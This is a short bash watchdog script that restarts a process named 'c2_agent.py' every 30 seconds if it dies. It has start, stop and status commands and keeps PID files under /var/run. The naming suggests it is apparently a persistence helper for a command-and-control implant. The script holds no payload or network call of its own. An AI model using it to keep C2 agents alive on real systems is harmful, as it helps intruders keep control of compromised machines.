#!/bin/bash

WATCHDOG_PID_FILE="/var/run/c2_watchdog.pid"
AGENT_PID_FILE="/var/run/c2_agent.pid"
C2_SCRIPT="/opt/c2_agent/c2_agent.py"

watchdog() {
    while true; do
        # Check if agent is running
        if ! pgrep -f "c2_agent.py" > /dev/null; then
            echo "[!] Agent died, restarting..."
            cd /opt/c2_agent
            python3 c2_agent.py &
            echo "[+] Agent restarted"
        fi
        sleep 30
    done
}

case "$1" in
    start)
        echo "[+] Starting watchdog..."
        watchdog &
        echo $! > $WATCHDOG_PID_FILE
        ;;
    stop)
        echo "[-] Stopping watchdog..."
        kill $(cat $WATCHDOG_PID_FILE) 2>/dev/null
        rm -f $WATCHDOG_PID_FILE
        ;;
    status)
        if [ -f $WATCHDOG_PID_FILE ] && kill -0 $(cat $WATCHDOG_PID_FILE) 2>/dev/null; then
            echo "[+] Watchdog is running"
        else
            echo "[-] Watchdog is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|status}"
        ;;
esac
